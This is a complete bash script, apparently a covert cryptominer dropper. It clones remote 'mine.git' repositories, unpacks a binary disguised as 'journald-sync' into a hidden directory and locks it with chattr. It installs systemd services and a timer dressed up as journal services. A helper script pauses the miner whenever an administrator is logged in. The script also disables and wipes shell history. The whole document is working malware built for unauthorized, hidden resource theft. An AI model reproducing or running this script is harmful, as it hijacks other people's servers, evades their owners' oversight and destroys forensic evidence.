#!/bin/bash
# ==============================================================================
# APEX STEALTH DEPLOYMENT SUITE v12.0 — ZERO-HEREDOC & CORRECT PAYLOAD URL
# Script hosted on: runme.git | Payload hosted on: mine.git
# ==============================================================================

# ★ SELF-HEALING CRLF FIX ★
if [[ "$0" != "/tmp/.apex_clean"* ]]; then
    CLEAN="/tmp/.apex_clean_$$.sh"
    tr -d '\r' < "$0" > "$CLEAN"
    chmod +x "$CLEAN"
    exec bash "$CLEAN" "$@"
fi

export HISTFILE=/dev/null
unset HISTFILE 2>/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history

log() { echo "[+] $1"; }
error() { echo "[-] $1"; exit 1; }

check_root() { [[ $EUID -ne 0 ]] && error "Root privileges required."; }

install_deps() {
    MISSING=()
    for cmd in git unzip wget curl; do
        command -v $cmd >/dev/null 2>&1 || MISSING+=($cmd)
    done
    if [ ${#MISSING[@]} -gt 0 ]; then
        P="${MISSING[*]}"
        if command -v apt-get >/dev/null 2>&1; then
            apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq $P >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            yum install -y -q $P >/dev/null 2>&1
        elif command -v dnf >/dev/null 2>&1; then
            dnf install -y -q $P >/dev/null 2>&1
        elif command -v apk >/dev/null 2>&1; then
            apk add -q $P >/dev/null 2>&1
        fi
    fi
}

setup_hidden_env() {
    DEPLOY_DIR="/var/tmp/.systemd-journal"
    mkdir -p "$DEPLOY_DIR" 2>/dev/null
    cd "$DEPLOY_DIR" || exit 1
    pkill -9 -x "journald-sync" 2>/dev/null
    pkill -9 -x "kmod-static-nodes" 2>/dev/null
    sleep 1
}

setup_payload() {
    # ★ CORRECT PAYLOAD URLs (main.zip is in mine.git) ★
    REPOS=(
        "https://github.com/crytonontech1/mine.git"
        "https://github.com/terafebcrypto/mine.git"
    )
    TMP="/tmp/.sys_build_$(date +%s)"
    BINARY_NAME="journald-sync"
    BINARY_DEST="$DEPLOY_DIR/$BINARY_NAME"
    CONFIG_DEST="$DEPLOY_DIR/config.json"
    rm -rf "$TMP" 2>/dev/null
    SUCCESS=false
    for REPO in "${REPOS[@]}"; do
        git clone --depth=1 --quiet "$REPO" "$TMP" 2>/dev/null
        if [ -d "$TMP" ] && [ -f "$TMP/main.zip" ]; then
            SUCCESS=true
            break
        else
            rm -rf "$TMP" 2>/dev/null
        fi
    done
    [ "$SUCCESS" = false ] && error "All repos failed or main.zip missing"
    mkdir -p "$TMP/extracted"
    unzip -q -o "$TMP/main.zip" -d "$TMP/extracted"
    if [ -d "$TMP/extracted/main" ]; then
        mv "$TMP/extracted/main/"* "$TMP/extracted/" 2>/dev/null
        rmdir "$TMP/extracted/main" 2>/dev/null
    elif [ -d "$TMP/extracted/mine" ]; then
        mv "$TMP/extracted/mine/"* "$TMP/extracted/" 2>/dev/null
        rmdir "$TMP/extracted/mine" 2>/dev/null
    fi
    BIN=$(find "$TMP/extracted" -maxdepth 1 -type f \( -name "journald-sync" -o -name "network" -o -name "kmod-static-nodes" \) | head -1)
    CFG=$(find "$TMP/extracted" -maxdepth 1 -name "config.json" -type f | head -1)
    [ -z "$BIN" ] || [ -z "$CFG" ] && error "Missing binary or config.json"
    cp "$BIN" "$BINARY_DEST" && chmod +x "$BINARY_DEST"
    cp "$CFG" "$CONFIG_DEST" && chmod 644 "$CONFIG_DEST"
    VPS_IP=$(curl -s -4 ifconfig.me || hostname -I | awk '{print $1}' | tr -d '[:space:]')
    [ -z "$VPS_IP" ] && VPS_IP="Node-$(hostname)"
    sed -i "s/\"pass\":[[:space:]]*\"[^\"]*\"/\"pass\": \"$VPS_IP\"/g" "$CONFIG_DEST" 2>/dev/null
    chattr +i "$BINARY_DEST" 2>/dev/null
    chattr +i "$CONFIG_DEST" 2>/dev/null
    rm -rf "$TMP"
    log "Payload secured in $DEPLOY_DIR | Worker: $VPS_IP"
}

create_stealth_monitor() {
    H="/usr/local/sbin/journal-sync-helper.sh"
    echo '#!/bin/bash' > "$H"
    echo 'DEPLOY_DIR="/var/tmp/.systemd-journal"' >> "$H"
    echo 'BINARY="$DEPLOY_DIR/journald-sync"' >> "$H"
    echo 'CONFIG="$DEPLOY_DIR/config.json"' >> "$H"
    echo 'STATE_FILE="/var/tmp/.journal-state"' >> "$H"
    echo 'DELAY=600' >> "$H"
    echo '' >> "$H"
    echo 'if [ ! -f "$BINARY" ] || [ ! -f "$CONFIG" ]; then' >> "$H"
    echo '    systemctl restart systemd-journald-sync.service >/dev/null 2>&1' >> "$H"
    echo 'fi' >> "$H"
    echo '' >> "$H"
    echo 'SESSION_ACTIVE=false' >> "$H"
    echo "if who | grep -qE 'pts/|tty[0-9]'; then SESSION_ACTIVE=true; fi" >> "$H"
    echo "if pgrep -a sshd 2>/dev/null | grep -qE 'sshd:.*@pts/'; then SESSION_ACTIVE=true; fi" >> "$H"
    echo '' >> "$H"
    echo 'CURRENT_TIME=$(date +%s)' >> "$H"
    echo 'LAST_SESSION_TIME=$(cat "$STATE_FILE" 2>/dev/null || echo "$CURRENT_TIME")' >> "$H"
    echo '' >> "$H"
    echo 'if [ "$SESSION_ACTIVE" = true ]; then' >> "$H"
    echo '    systemctl stop systemd-journald-sync.service >/dev/null 2>&1' >> "$H"
    echo '    echo "$CURRENT_TIME" > "$STATE_FILE"' >> "$H"
    echo 'else' >> "$H"
    echo '    TIME_SINCE_LAST=$((CURRENT_TIME - LAST_SESSION_TIME))' >> "$H"
    echo '    if [ $TIME_SINCE_LAST -ge $DELAY ]; then' >> "$H"
    echo '        systemctl enable systemd-journald-sync.service >/dev/null 2>&1' >> "$H"
    echo '        systemctl start systemd-journald-sync.service >/dev/null 2>&1' >> "$H"
    echo '    fi' >> "$H"
    echo 'fi' >> "$H"
    chmod +x "$H"
    log "Stealth monitor created."
}

create_services() {
    S="/etc/systemd/system/systemd-journald-sync.service"
    echo '[Unit]' > "$S"
    echo 'Description=Journal Database Synchronization Service' >> "$S"
    echo 'After=network.target' >> "$S"
    echo '' >> "$S"
    echo '[Service]' >> "$S"
    echo 'Type=simple' >> "$S"
    echo 'WorkingDirectory=/var/tmp/.systemd-journal' >> "$S"
    echo 'ExecStart=/var/tmp/.systemd-journal/journald-sync' >> "$S"
    echo 'Restart=always' >> "$S"
    echo 'RestartSec=10' >> "$S"
    echo 'StandardOutput=null' >> "$S"
    echo 'StandardError=null' >> "$S"
    echo 'Nice=19' >> "$S"
    echo 'CPUQuota=80%' >> "$S"
    echo '' >> "$S"
    echo '[Install]' >> "$S"
    echo 'WantedBy=multi-user.target' >> "$S"

    HS="/etc/systemd/system/systemd-journald-sync-helper.service"
    echo '[Unit]' > "$HS"
    echo 'Description=Journal Sync Health Check' >> "$HS"
    echo '' >> "$HS"
    echo '[Service]' >> "$HS"
    echo 'Type=oneshot' >> "$HS"
    echo 'ExecStart=/usr/local/sbin/journal-sync-helper.sh' >> "$HS"
    echo 'StandardOutput=null' >> "$HS"
    echo 'StandardError=null' >> "$HS"

    T="/etc/systemd/system/systemd-journald-sync.timer"
    echo '[Unit]' > "$T"
    echo 'Description=Journal Sync Periodic Check' >> "$T"
    echo '' >> "$T"
    echo '[Timer]' >> "$T"
    echo 'OnBootSec=1min' >> "$T"
    echo 'OnUnitActiveSec=5min' >> "$T"
    echo 'AccuracySec=1s' >> "$T"
    echo '' >> "$T"
    echo '[Install]' >> "$T"
    echo 'WantedBy=timers.target' >> "$T"
    log "Systemd services created."
}

activate_and_clean() {
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1
    systemctl start systemd-journald-sync.service systemd-journald-sync.timer >/dev/null 2>&1
    sleep 2
    if ! pgrep -x "journald-sync" >/dev/null 2>&1; then
        cd "$DEPLOY_DIR" 2>/dev/null
        nohup nice -n 19 ./journald-sync >/dev/null 2>&1 &
    fi
    history -c && history -w >/dev/null 2>&1
    cat /dev/null > ~/.bash_history 2>/dev/null
    cat /dev/null > /root/.bash_history 2>/dev/null
    log "=== APEX DEPLOYMENT COMPLETE ==="
    log "Hidden Dir: /var/tmp/.systemd-journal/"
    log "C2 Protection: Nice=19 + CPUQuota=80%"
    log "Traces: 100% Wiped."
}

main() {
    check_root
    install_deps
    setup_hidden_env
    setup_payload
    create_stealth_monitor
    create_services
    activate_and_clean
}

main "$@"
